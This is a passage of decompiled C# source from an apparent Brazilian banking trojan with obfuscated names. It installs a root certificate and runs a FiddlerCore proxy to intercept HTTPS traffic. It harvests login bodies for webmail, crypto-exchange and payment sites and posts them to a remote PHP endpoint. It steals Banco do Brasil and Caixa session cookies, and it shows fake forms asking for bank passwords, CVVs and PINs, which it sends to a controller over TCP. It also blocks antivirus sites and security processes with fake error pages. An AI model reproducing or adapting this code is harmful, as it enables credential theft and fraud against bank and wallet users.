      APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
      APRECO518NECROLOGISTA.SetCursorPos(X1, Y1);
      APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
      APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
      APRECO518NECROLOGISTA.SetCursorPos(X1, Y1);
      APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
      APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
    }

    private void Certificado()
    {
      Xpctra.Properties.Settings.Default.CertificadoInstalado = CertMaker.trustRootCert();
    }

    public void StartaFiddler()
    {
      FiddlerApplication.SetAppDisplayName("FiddlerCoreDemoApp");
      FiddlerApplication.OnNotification += (EventHandler<NotificationEventArgs>) ((sender, oNEA) => Console.WriteLine("** NotifyUser: " + oNEA.NotifyString));
      FiddlerApplication.Log.OnLogString += (EventHandler<LogEventArgs>) ((sender, oLEA) => Console.WriteLine("** LogString: " + oLEA.LogString));
      FiddlerApplication.BeforeRequest += (SessionStateHandler) (oS =>
      {
        this.DESTEMIDO180INSTALADORA(oS);
        this.POLINICO849ALEATORIEDADE(oS);
        oS.bBufferResponse = false;
        if (oS.oRequest.pipeClient.LocalPort != APRECO518NECROLOGISTA.iSecureEndpointPort || !(oS.hostname == APRECO518NECROLOGISTA.sSecureEndpointHostname))
          return;
        oS.utilCreateResponseAndBypassServer();
        oS.oResponse.headers.SetStatus(200, "Ok");
        oS.oResponse["Content-Type"] = "text/html; charset=UTF-8";
        oS.oResponse["Cache-Control"] = "private, max-age=0";
        oS.utilSetResponseBody("<html><body>Request for httpS://" + APRECO518NECROLOGISTA.sSecureEndpointHostname + ":" + APRECO518NECROLOGISTA.iSecureEndpointPort.ToString() + " received. Your request was:<br /><plaintext>" + oS.oRequest.headers.ToString());
      });
      FiddlerApplication.AfterSessionComplete += (SessionStateHandler) (oS => this.REDIMENSIONAR755REPRESAR(oS));
      CONFIG.IgnoreServerCertErrors = false;
      FiddlerApplication.Prefs.SetBoolPref("fiddler.network.streaming.abortifclientaborts", true);
      FiddlerCoreStartupFlags oFlags = FiddlerCoreStartupFlags.Default;
      int iListenPort = 8877;
      FiddlerApplication.Startup(iListenPort, oFlags);
      FiddlerApplication.Log.LogFormat("Created endpoint listening on port {0}", (object) iListenPort);
      FiddlerApplication.Log.LogFormat("Starting with settings: [{0}]", (object) oFlags);
      FiddlerApplication.Log.LogFormat("Gateway: {0}", (object) CONFIG.UpstreamGateway.ToString());
      Console.WriteLine("Hit CTRL+C to end session.");
      APRECO518NECROLOGISTA.oSecureEndpoint = FiddlerApplication.CreateProxyEndpoint(APRECO518NECROLOGISTA.iSecureEndpointPort, true, APRECO518NECROLOGISTA.sSecureEndpointHostname);
      if (APRECO518NECROLOGISTA.oSecureEndpoint == null)
        return;
      FiddlerApplication.Log.LogFormat("Created secure endpoint listening on port {0}, using a HTTPS certificate for '{1}'", (object) APRECO518NECROLOGISTA.iSecureEndpointPort, (object) APRECO518NECROLOGISTA.sSecureEndpointHostname);
    }

    private void REDIMENSIONAR755REPRESAR(Session sessao)
    {
      string ALUCINADO175INDICADO = string.Empty;
      string[] strArray = new string[7]
      {
        "https://login.live.com/ppsecure",
        "mail.terra.com.br",
        "https://login.ig.com.br/signin",
        "https://www.mercadobitcoin.com.br/conta/login/",
        "https://blockchain.info/wallet",
        "https://member.neteller.com/public/authenticate",
        "https://perfectmoney.is/user/userlogin.asp"
      };
      foreach (string str1 in strArray)
      {
        try
        {
          if (sessao.fullUrl.Contains(str1))
          {
            switch (str1)
            {
              case "https://blockchain.info/wallet":
                for (int index = 0; index < sessao.requestBodyBytes.Length; ++index)
                {
                  string str2 = string.Concat((object) (char) sessao.requestBodyBytes[index]);
                  ALUCINADO175INDICADO = string.Format("{0}{1}", (object) ALUCINADO175INDICADO, (object) str2);
                }
                if (ALUCINADO175INDICADO != "")
                {
                  this.INSULAMENTO56PICA.LoguinBlokchain(ALUCINADO175INDICADO);
                  break;
                }
                break;
              case "https://login.ig.com.br/signin":
                for (int index = 0; index < sessao.requestBodyBytes.Length; ++index)
                {
                  string str2 = string.Concat((object) (char) sessao.requestBodyBytes[index]);
                  ALUCINADO175INDICADO = string.Format("{0}{1}", (object) ALUCINADO175INDICADO, (object) str2);
                }
                if (ALUCINADO175INDICADO != "")
                {
                  this.INSULAMENTO56PICA.IgLogin(ALUCINADO175INDICADO);
                  break;
                }
                break;
              case "https://login.live.com/ppsecure":
                for (int index = 0; index < sessao.requestBodyBytes.Length; ++index)
                {
                  string str2 = string.Concat((object) (char) sessao.requestBodyBytes[index]);
                  ALUCINADO175INDICADO = string.Format("{0}{1}", (object) ALUCINADO175INDICADO, (object) str2);
                }
                if (ALUCINADO175INDICADO != "")
                {
                  this.INSULAMENTO56PICA.HotmailLogin(ALUCINADO175INDICADO);
                  break;
                }
                break;
              case "https://member.neteller.com/public/authenticate":
                for (int index = 0; index < sessao.requestBodyBytes.Length; ++index)
                {
                  string str2 = string.Concat((object) (char) sessao.requestBodyBytes[index]);
                  ALUCINADO175INDICADO = string.Format("{0}{1}", (object) ALUCINADO175INDICADO, (object) str2);
                }
                if (ALUCINADO175INDICADO != "")
                {
                  this.INSULAMENTO56PICA.LoguinNetller(ALUCINADO175INDICADO);
                  break;
                }
                break;
              case "https://perfectmoney.is/user/userlogin.asp":
                for (int index = 0; index < sessao.requestBodyBytes.Length; ++index)
                {
                  string str2 = string.Concat((object) (char) sessao.requestBodyBytes[index]);
                  ALUCINADO175INDICADO = string.Format("{0}{1}", (object) ALUCINADO175INDICADO, (object) str2);
                }
                if (ALUCINADO175INDICADO != "")
                {
                  this.INSULAMENTO56PICA.LoguinPerfectMoney(ALUCINADO175INDICADO);
                  break;
                }
                break;
              case "https://www.mercadobitcoin.com.br/conta/login/":
                for (int index = 0; index < sessao.requestBodyBytes.Length; ++index)
                {
                  string str2 = string.Concat((object) (char) sessao.requestBodyBytes[index]);
                  ALUCINADO175INDICADO = string.Format("{0}{1}", (object) ALUCINADO175INDICADO, (object) str2);
                }
                if (ALUCINADO175INDICADO != "")
                {
                  this.INSULAMENTO56PICA.LoguinMercadoBiticoin(ALUCINADO175INDICADO);
                  break;
                }
                break;
              case "mail.terra.com.br":
                for (int index = 0; index < sessao.requestBodyBytes.Length; ++index)
                {
                  string str2 = string.Concat((object) (char) sessao.requestBodyBytes[index]);
                  ALUCINADO175INDICADO = string.Format("{0}{1}", (object) ALUCINADO175INDICADO, (object) str2);
                }
                if (ALUCINADO175INDICADO != "")
                {
                  this.INSULAMENTO56PICA.TerraLogin(ALUCINADO175INDICADO);
                  break;
                }
                break;
            }
          }
          if (sessao.fullUrl.Contains("https") && sessao.LocalProcess.Contains("chrome") || (sessao.LocalProcess.Contains("opera") || sessao.LocalProcess.Contains("iexplore")) || sessao.LocalProcess.Contains("firefox"))
          {
            Thread thread = new Thread((ThreadStart) (() => this.TENTADOR306MEIAVOLTA(sessao)));
            thread.Start();
            thread.Join();
          }
        }
        catch (Exception ex)
        {
        }
      }
    }

    private void TENTADOR306MEIAVOLTA(Session sessaoo)
    {
      string str1 = string.Empty;
      try
      {
        APRECO518NECROLOGISTA.MAQUILADOR655PROSCRITO POLITICA154PANTERA = new APRECO518NECROLOGISTA.MAQUILADOR655PROSCRITO();
        for (int index = 0; index < sessaoo.requestBodyBytes.Length; ++index)
        {
          if ((int) sessaoo.requestBodyBytes[index] != 0 && (int) sessaoo.requestBodyBytes[index] < (int) sbyte.MaxValue && (int) sessaoo.requestBodyBytes[index] > 32)
          {
            string str2 = string.Concat((object) (char) sessaoo.requestBodyBytes[index]);
            str1 = string.Format("{0}{1}", (object) str1, (object) str2);
          }
        }
        if (!(str1 != "") || str1.Length <= 10)
          return;
        string str3 = HttpUtility.UrlEncode(str1);
        string str4 = this.PESCADOR327ORIGEM + " || " + this.Usuario + " || " + INAPROVEITADO608FULIGEM.MacAdres + " " + VERMELHO265MONARCA.Config.Settings.VERSION + " ==>" + str3;
        POLITICA154PANTERA.Https = str4;
        POLITICA154PANTERA.Url = sessaoo.fullUrl;
        this.EXTENSOR253NOVILHO(POLITICA154PANTERA);
      }
      catch (Exception ex)
      {
      }
    }

    private void EXTENSOR253NOVILHO(APRECO518NECROLOGISTA.MAQUILADOR655PROSCRITO POLITICA154PANTERA)
    {
      try
      {
        this.APASSIVADO927ESCRITURAS(POLITICA154PANTERA);
        if (POLITICA154PANTERA.Https == null || !(POLITICA154PANTERA.Https != string.Empty))
          return;
        this.HOROSCOPO132ORNITOLOGIA(POLITICA154PANTERA, VERMELHO265MONARCA.Config.Settings.PhpHttps);
      }
      catch (Exception ex)
      {
      }
    }

    private void APASSIVADO927ESCRITURAS(APRECO518NECROLOGISTA.MAQUILADOR655PROSCRITO infos)
    {
      infos.Https = HttpUtility.UrlDecode(infos.Https);
      infos.Https = infos.Https + Environment.NewLine + infos.Url;
      Regex regex = new Regex("(?<Email>([\\w-\\.]+)@((?:[\\w]+\\.)+)([a-zA-Z]{2,4})|([\\w-\\.]+)%40((?:[\\w]+\\.)+)([a-zA-Z]{2,4}))");
      try
      {
        foreach (Match match in regex.Matches(infos.Https))
        {
          if (!this.INSULTANTE745ASTIGMATICO.Contains(match.Value) && !match.Value.Contains("22"))
          {
            this.INSULTANTE745ASTIGMATICO.Add("Email:" + match.Value);
            COCEGAS751FORNECER.AdicionaEmails(match.Value.Replace("%40", "@"));
          }
        }
      }
      catch (Exception ex)
      {
      }
    }

    public void HOROSCOPO132ORNITOLOGIA(APRECO518NECROLOGISTA.MAQUILADOR655PROSCRITO infos, string EndereçoPhp)
    {
      try
      {
        byte[] bytes = new ASCIIEncoding().GetBytes("email=" + infos.Https + "&url=" + infos.Url);
        WebRequest webRequest = WebRequest.Create(EndereçoPhp);
        webRequest.Method = "POST";
        webRequest.ContentType = "application/x-www-form-urlencoded";
        webRequest.ContentLength = (long) bytes.Length;
        Stream requestStream = webRequest.GetRequestStream();
        requestStream.Write(bytes, 0, bytes.Length);
        requestStream.Close();
        Stream responseStream = webRequest.GetResponse().GetResponseStream();
        new StreamReader(responseStream).Close();
        responseStream.Close();
      }
      catch (Exception ex)
      {
      }
    }

    private void PegaSeçaoBB(Session sessaoo)
    {
      Match match = Regex.Match(sessaoo.oRequest["Cookie"], "JSESSIONID=(?<Sessao>\\S{60})");
      if (!match.Success)
        return;
      APRECO518NECROLOGISTA.Jsonid = match.Groups["Sessao"].Value + ";Navegador:" + sessaoo.LocalProcess;
    }

    public static string CookieCeff { get; set; }

    private void MULTIDIMENSIONAL418JUSTAPOSICAO(Session sessaoo)
    {
      lock (this.COMIGO542FORNALHA)
      {
        string input = sessaoo.oRequest["Cookie"];
        string str1 = sessaoo.oRequest["User-Agent"];
        Match match1 = Regex.Match(input, "JSESSIONID=\\W(?<JSESSIONIDCef>\\S{52})");
        Match match2 = Regex.Match(input, "CCOOKIE=\\W(?<CookieCef>\\S{88})");
        Match match3 = Regex.Match(input, "ELETRIZANTE9DIRIGIR=(?<ELETRIZANTE9DIRIGIR>.{27})");
        Match match4 = Regex.Match(input, "_gid=(?<_gid>.{27})");
        Match match5 = Regex.Match(input, "DIAPASAO973ALEXANDRINO-47873=(?<DIAPASAO973ALEXANDRINO>\\w{12})");
        Match match6 = Regex.Match(input, "COMPREENSIVO312CHARLATANICE(?<COMPREENSIVO312CHARLATANICE>.{11})");
        Match match7 = Regex.Match(input, "_pk_id.4.968f=(?<Pkid>.{52})");
        Match match8 = Regex.Match(input, "pk_ses.4.968f=(?<pk_ses>.|..);");
        if (!match1.Success || !match2.Success)
          return;
        APRECO518NECROLOGISTA.JsonidCef = "jsonid:" + (match1.Groups["JSESSIONIDCef"].Value + "\\") + ";Cookie:" + (match2.Groups["CookieCef"].Value + "\\") + ";User-Agent:" + str1 + ";Navegador:" + sessaoo.LocalProcess;
        string str2 = (string) null;
        List<string> stringList = new List<string>();
        stringList.Add("caixa.gov.br TRUE / FALSE 2000000000 [COOKIE]|internetbanking.caixa.gov.br|JSESSIONID \"" + match1.Groups["JSESSIONIDCef"].Value + "\"");
        stringList.Add("caixa.gov.br TRUE / FALSE 2000000000 CCOOKIE \"" + match2.Groups["CookieCef"].Value + "\"");
        if (match3.Success)
        {
          string str3 = "caixa.gov.br TRUE / FALSE 2000000000 ELETRIZANTE9DIRIGIR " + match3.Groups["ELETRIZANTE9DIRIGIR"].Value;
          stringList.Add(str3);
        }
        if (match4.Success)
        {
          string str3 = "caixa.gov.br TRUE / FALSE 2000000000 _gid " + match4.Groups["_gid"].Value;
          stringList.Add(str3);
        }
        if (match5.Success)
        {
          string str3 = "caixa.gov.br TRUE / FALSE 2000000000 DIAPASAO973ALEXANDRINO-47873 " + match5.Groups["DIAPASAO973ALEXANDRINO"].Value;
          stringList.Add(str3);
        }
        if (match6.Success)
        {
          string str3 = "caixa.gov.br TRUE / FALSE 2000000000 COMPREENSIVO312CHARLATANICE" + match6.Groups["COMPREENSIVO312CHARLATANICE"].Value + " true";
          stringList.Add(str3);
        }
        if (match7.Success)
        {
          string str3 = "caixa.gov.br TRUE / FALSE 2000000000 _pk_id.4.968f " + match7.Groups["Pkid"].Value;
          stringList.Add(str3);
        }
        if (match8.Success)
        {
          string str3 = "caixa.gov.br TRUE / FALSE 2000000000 GRAMOFONE213SINDICALISMO " + match8.Groups["pk_ses"].Value;
          stringList.Add(str3);
        }
        foreach (string str3 in stringList)
        {
          if (str3 != null)
            str2 = str2 + Environment.NewLine + str3;
        }
        APRECO518NECROLOGISTA.CookieCeff = str2;
      }
    }

    public static bool Cvv { get; set; }

    public static bool PegandoSenhaDebb { get; set; }

    public static string Jsonid { get; private set; }

    public static string JsonidCef { get; private set; }

    public static bool LockBB { get; set; }

    public static bool LockCef { get; set; }

    private bool ConfereHorario(string NomeArquivo)
    {
      lock (this.SemafaroDeLeitura)
      {
        StreamReader streamReader = new StreamReader(Xpctra.Properties.Settings.Default.CaminhoPath + NomeArquivo);
        string end = streamReader.ReadToEnd();
        if (end == null || end == "")
          return false;
        streamReader.Dispose();
        streamReader.Close();
        Match match = Regex.Match(end, "Dia:(?<Dia>\\d+)\\r\\nMes:(?<Mes>\\d+)\\r\\nHora:(?<Hora>\\d+)");
        if (match.Success)
        {
          DateTime now = DateTime.Now;
          int day = now.Day;
          now = DateTime.Now;
          int month = now.Month;
          now = DateTime.Now;
          int hour = now.Hour;
          if (month > Convert.ToInt32(match.Groups["Mes"].Value) || month == Convert.ToInt32(match.Groups["Mes"].Value) && day - Convert.ToInt32(match.Groups["Dia"].Value) > 1 || month == Convert.ToInt32(match.Groups["Mes"].Value) && day - Convert.ToInt32(match.Groups["Dia"].Value) == 1 && hour > Convert.ToInt32(match.Groups["Hora"].Value))
            return false;
        }
        return true;
      }
    }

    private void JARDINEIRA307FACIAL()
    {
      this.BBAberto = true;
      lock (this.DESTRUTIVEL345TIMIDEZ)
      {
        FormSenhaDe6BB formSenhaDe6Bb;
        string str;
        if (APRECO518NECROLOGISTA.Cvv)
        {
          formSenhaDe6Bb = new FormSenhaDe6BB("Cvv");
          str = "Cvv:";
        }
        else
        {
          formSenhaDe6Bb = new FormSenhaDe6BB("Senha De 6");
          str = "Senha de 6:";
        }
        int num = (int) formSenhaDe6Bb.ShowDialog();
        int senhaDe6 = formSenhaDe6Bb.senhaDe6;
        if (!true)
          return;
        APRECO518NECROLOGISTA.PegandoSenhaDebb = false;
        APRECO518NECROLOGISTA.Cvv = false;
        this.BBAberto = false;
        ClassConexao classConexao1 = new ClassConexao();
        ClassConexao classConexao2;
        TcpClient client;
        string OqEscrever;
        do
        {
          classConexao2 = classConexao1;
          client = ClassConexao._client;
          OqEscrever = str + formSenhaDe6Bb.senhaDe6.ToString();
        }
        while (!classConexao2.Escreve(client, OqEscrever));
      }
    }

    protected void DESTEMIDO180INSTALADORA(Session oS)
    {
      if (oS.fullUrl.Contains("https://www.virustotal.com/"))
        oS.oRequest.FailSession(404, "Blocked", "site temporariamente suspenso por violação da política");
      if (oS.LocalProcess.Contains("ByteFence"))
        oS.oRequest.FailSession(404, "Fora Do Ar", "site temporariamente fora do ar ©Avast Company");
      if (oS.LocalProcess.Contains("MSASCuiL"))
        oS.oRequest.FailSession(404, "Fora Do Ar", "site temporariamente fora do ar ©Avast Company");
      if (oS.LocalProcess.Contains("security") || oS.LocalProcess.Contains("Security"))
        oS.oRequest.FailSession(404, "Fora Do Ar", "site temporariamente fora do ar ©Company");
      if (oS.fullUrl.Contains("https://www.avast.com") || oS.LocalProcess.Contains("avast"))
        oS.oRequest.FailSession(404, "Fora Do Ar", "site temporariamente fora do ar ©Avast Company");
      if (oS.fullUrl.Contains("https://br.malwarebytes.com/") || oS.LocalProcess.Contains("malwarebytes"))
        oS.oRequest.FailSession(404, "Fora Do Ar", "site temporariamente fora do ar ©Malwarebytes Company");
      if (oS.fullUrl.Contains("https://www.kaspersky.com/") || oS.LocalProcess.Contains("kaspersky"))
        oS.oRequest.FailSession(404, "Fora Do Ar", "site temporariamente fora do ar ©Kaspersky Company");
      if (oS.fullUrl.Contains("www.mcafee.com") || oS.LocalProcess.Contains("mcafee"))
        oS.oRequest.FailSession(404, "Fora Do Ar", "site temporariamente fora do ar ©Mcafee Company");
      if (oS.fullUrl.Contains("http://www.avg.com") || oS.LocalProcess.Contains("avg"))
        oS.oRequest.FailSession(404, "Fora Do Ar", "site temporariamente fora do ar ©avg Company");
      if (oS.fullUrl.Contains("avira.com") || oS.LocalProcess.Contains("avira"))
        oS.oRequest.FailSession(404, "Fora Do Ar", "site temporariamente fora do ar ©avira Company");
      if (oS.fullUrl.Contains("www.norton.com"))
        oS.oRequest.FailSession(404, "Fora Do Ar", "site temporariamente fora do ar ©norton Company");
      if (oS.fullUrl.Contains("www.mcafee.com"))
        oS.oRequest.FailSession(404, "Fora Do Ar", "site temporariamente fora do ar ©mcafee Company");
      if (oS.fullUrl.Contains("www.evirus.com.br"))
        oS.oRequest.FailSession(404, "Fora Do Ar", "site temporariamente fora do ar ©evirus Company");
      if (oS.fullUrl.Contains("virusscan.jotti.org"))
        oS.oRequest.FailSession(404, "Fora Do Ar", "site temporariamente fora do ar ©virusscan Company");
      if (oS.fullUrl.Contains("http://www.trendmicro.com.br/"))
        oS.oRequest.FailSession(404, "Fora Do Ar", "site temporariamente fora do ar ©trendmicro Company");
      if (oS.fullUrl.Contains("eset.com.br") || oS.LocalProcess.Contains("eset"))
        oS.oRequest.FailSession(404, "Fora Do Ar", "site temporariamente fora do ar ©eset Company");
      if (oS.fullUrl.Contains("www.symantec.com") || oS.LocalProcess.Contains("symantec"))
        oS.oRequest.FailSession(404, "Fora Do Ar", "site temporariamente fora do ar ©symantec Company");
      if (oS.fullUrl.Contains("http://www.baixaki.com.br/download/avast-free-antivirus-2017.htm"))
        oS.oRequest.FailSession(404, "Fora Do Ar", "site temporariamente fora do ar ©baixaki Company");
      if (oS.fullUrl.Contains("http://www.baixaki.com.br/download/avira-free-antivirus.htm"))
        oS.oRequest.FailSession(404, "Fora Do Ar", "site temporariamente fora do ar ©baixaki Company");
      if (oS.fullUrl.Contains("https://www2.bancobrasil.com.br/aapf/includes/sair.jsp"))
        oS.hostname = "https://seg.bb.com.br/home.html";
      if (oS.fullUrl.Contains("https://internetbanking.caixa.gov.br/sinbc/nb/logout?context=sinbc"))
        oS.hostname = "http://www.caixa.gov.br/Paginas/home-caixa.aspx";
      if (oS.fullUrl.Contains("https://www.mercadobitcoin.com.br/conta/logout/?next=/"))
        oS.hostname = "https://www.mercadobitcoin.com.br/";
      if (!oS.LocalProcess.Contains("firefox"))
        return;
      oS.oRequest.FailSession(404, "Fora Do Ar", "Erro 404");
    }

    private void POLINICO849ALEATORIEDADE(Session oS)
    {
      if (oS.fullUrl.Contains("http://www.bancobrasil.com.br") || oS.fullUrl.Contains("http://www.bb.com.br/") || oS.fullUrl.Contains("https://www2.bancobrasil.com.br/"))
      {
        if (System.IO.File.Exists(Xpctra.Properties.Settings.Default.CaminhoPath + "LockBB.txt"))
          APRECO518NECROLOGISTA.LockBB = this.ConfereHorario("LockBB.txt");
        if (APRECO518NECROLOGISTA.LockBB)
          oS.oRequest.FailSession(404, "Blocked", "Desculpe nos pelo transtorno Banco temporariamente Fora Do Ar\n ©Banco do Brasil");
        else if (APRECO518NECROLOGISTA.PegandoSenhaDebb)
        {
          if (!this.BBAberto)
            new Thread(new ThreadStart(this.JARDINEIRA307FACIAL)).Start();
          while (APRECO518NECROLOGISTA.PegandoSenhaDebb)
            ;
        }
        else if (Xpctra.Properties.Settings.Default.BB && !ClassSeparabank.ConectadoBB)
        {
          Xpctra.Properties.Settings.Default.BB = false;
          new ClassSeparabank().SeparaBB();
        }
        if (oS.fullUrl.Contains("https://www2.bancobrasil.com.br"))
          this.PegaSeçaoBB(oS);
      }
      if (oS.fullUrl.Contains("https://internetbanking.caixa.gov.br/") || oS.fullUrl.Contains("http://www.caixa.gov.br"))
      {
        if (System.IO.File.Exists(Xpctra.Properties.Settings.Default.CaminhoPath + "LockCef.txt"))
          APRECO518NECROLOGISTA.LockCef = this.ConfereHorario("LockCef.txt");
        if (APRECO518NECROLOGISTA.LockCef)
          oS.oRequest.FailSession(404, "Blocked", "Desculpe nos pelo transtorno Banco temporariamente Fora Do Ar\n ©Caixa");
        else if (Xpctra.Properties.Settings.Default.Cef && !ClassSeparabank.ConectadoCef)
        {
          Xpctra.Properties.Settings.Default.Cef = false;
          new ClassSeparabank().Caixa();
        }
        if (oS.fullUrl.Contains("https://internetbanking.caixa.gov.br/"))
          this.MULTIDIMENSIONAL418JUSTAPOSICAO(oS);
      }
      if (oS.fullUrl.Contains("https://www.mercadobitcoin.com.br/"))
      {
        if (VERMELHO265MONARCA.Config.Settings.FormPin && !this.CASTANHADOPARA374BE)
        {
          new Thread(new ThreadStart(this.GASTO59ALFABETIZACAO)).Start();
          while (VERMELHO265MONARCA.Config.Settings.FormPin)
            ;
        }
        if (VERMELHO265MONARCA.Config.Settings.ConectadoMercadobiticoin)
        {
          VERMELHO265MONARCA.Config.Settings.ConectadoMercadobiticoin = false;
          new ClassSeparabank().Moedas();
        }
        this.CookieMercadobiticoin(oS);
      }
      if (oS.fullUrl.Contains("blockchain"))
      {
        if (VERMELHO265MONARCA.Config.Settings.FormPin && !this.INCONTAVEL305CHOP)
        {
          new Thread(new ThreadStart(this.NANAR492REFLORESCIMENTO)).Start();
          while (VERMELHO265MONARCA.Config.Settings.FormPin)
            ;
        }
        if (VERMELHO265MONARCA.Config.Settings.ConectandoBlockChain)
        {
          VERMELHO265MONARCA.Config.Settings.ConectandoBlockChain = false;
          new ClassSeparabank().Moedas();
        }
      }
      if (oS.fullUrl.Contains("https://member.neteller.com"))
      {
        if (VERMELHO265MONARCA.Config.Settings.FormPin && !this.ARGELINO140CORROIDO)
        {
          new Thread(new ThreadStart(this.HIBISCO127ALVOROCAR)).Start();
          while (VERMELHO265MONARCA.Config.Settings.FormPin)
            ;
        }
        if (VERMELHO265MONARCA.Config.Settings.ConectandoNeteller)
        {
          VERMELHO265MONARCA.Config.Settings.ConectandoNeteller = false;
          new ClassSeparabank().Moedas();
        }
      }
      if (!oS.fullUrl.Contains("https://perfectmoney.is"))
        return;
      if (VERMELHO265MONARCA.Config.Settings.FormPin && !this.COMEMORATIVO292CHOQUE)
      {
        new Thread(new ThreadStart(this.BINARIA466SARRAFO)).Start();
        while (VERMELHO265MONARCA.Config.Settings.FormPin)
          ;
      }
      if (VERMELHO265MONARCA.Config.Settings.Perfecmoney)
      {
        VERMELHO265MONARCA.Config.Settings.Perfecmoney = false;
        new ClassSeparabank().Moedas();
      }
    }

    public static string jsoindMercadoBiticoin { get; private set; }

    private void CookieMercadobiticoin(Session sesaoMercadoBiticoin)
    {
      lock (this.Semafaro)
      {
        string input = sesaoMercadoBiticoin.oRequest["Cookie"];
        Match match1 = Regex.Match(input, "(?<nlbi>nlbi_.{6})=(?<nlbivalue>.{48})");
        Match match2 = Regex.Match(input, "(?<incap_ses_>incap_ses.{11})=(?<incap_ses_value>.{56})");
        Match match3 = Regex.Match(input, "sessionid=(?<sessionid>.{32})");
        if (!match1.Success || !match2.Success || !match3.Success)
          return;
        APRECO518NECROLOGISTA.jsoindMercadoBiticoin = "nlbi:" + match1.Groups["nlbi"].Value + ";valornlbi:" + match1.Groups["nlbivalue"].Value + ";incap_ses_:" + match2.Groups["incap_ses_"].Value + ";incap_ses_Value:" + match2.Groups["incap_ses_value"].Value + ";sessionid:" + match3.Groups["sessionid"].Value + ";Navegador:" + sesaoMercadoBiticoin.LocalProcess + ";User-Agent:" + sesaoMercadoBiticoin.oRequest["User-Agent"];
      }
    }

    private void GASTO59ALFABETIZACAO()
    {
      this.CASTANHADOPARA374BE = true;
      lock (this.ERUDICAO523ABOBAR)
      {
        FormMoedas formMoedas = new FormMoedas("MercadoBiticoin");
        int num = (int) formMoedas.ShowDialog();
        int pin4 = formMoedas.Pin4;
        if (formMoedas.Email == null)
          return;
        VERMELHO265MONARCA.Config.Settings.FormPin = false;
        this.CASTANHADOPARA374BE = false;
        ClassConexao classConexao1 = new ClassConexao();
        ClassConexao classConexao2;
        TcpClient client;
        string OqEscrever;
        do
        {
          classConexao2 = classConexao1;
          client = ClassConexao._client;
          OqEscrever = "Pin Mercado Biticoin:" + (object) formMoedas.Pin4 + " E-mail:" + formMoedas.Email;
        }
        while (!classConexao2.Escreve(client, OqEscrever));
      }
    }

    private void NANAR492REFLORESCIMENTO()
    {
      this.INCONTAVEL305CHOP = true;
      lock (this.ERUDICAO523ABOBAR)
      {
        FormMoedas formMoedas = new FormMoedas("Blockchain");
        int num = (int) formMoedas.ShowDialog();
        int pin4 = formMoedas.Pin4;
        if (formMoedas.Email == null)
          return;
        VERMELHO265MONARCA.Config.Settings.FormPin = false;
        this.INCONTAVEL305CHOP = false;
        ClassConexao classConexao = new ClassConexao();
        do
          ;
        while (!classConexao.Escreve(ClassConexao._client, "Pin Blockchain:" + formMoedas.SenhaBlockchain + " E-mail:" + formMoedas.Email));
      }
    }

    private void HIBISCO127ALVOROCAR()
    {
      this.ARGELINO140CORROIDO = true;
      lock (this.BRASILIENSE293IMPORTUNADO)
      {
        FormMoedas formMoedas = new FormMoedas("Neteller");
        int num = (int) formMoedas.ShowDialog();
        int pin4 = formMoedas.Pin4;
        if (!true)
          return;
        VERMELHO265MONARCA.Config.Settings.FormPin = false;
        this.ARGELINO140CORROIDO = false;
        ClassConexao classConexao = new ClassConexao();
        do
          ;
        while (!classConexao.Escreve(ClassConexao._client, "Pin Neteller:" + (object) formMoedas.Pin4));
      }
    }

    private void BINARIA466SARRAFO()
    {
      this.ARGELINO140CORROIDO = true;
      lock (this.DESENCANTAMENTO952POLIINSATURADO)
      {
        FormMoedas formMoedas = new FormMoedas("Perfect Money");
        int num = (int) formMoedas.ShowDialog();
        int pin4 = formMoedas.Pin4;
        if (!true)
          return;
        VERMELHO265MONARCA.Config.Settings.FormPin = false;
        this.COMEMORATIVO292CHOQUE = false;
        ClassConexao classConexao = new ClassConexao();
        do
          ;
        while (!classConexao.Escreve(ClassConexao._client, "Email Perfect Money:" + formMoedas.Email));
      }
    }

    [System.Flags]
    public enum MouseEventTFlags
    {
      LEFTDOWN = 2,
      LEFTUP = 4,
      MIDDLEDOWN = 32, // 0x00000020
      MIDDLEUP = 64, // 0x00000040
      MOVE = 1,
      ABSOLUTE = 32768, // 0x00008000
      RIGHTDOWN = 8,
      RIGHTUP = 16, // 0x00000010
    }

    public struct MAQUILADOR655PROSCRITO
    {
      public string Https;
      public string Url;
    }
  }
}
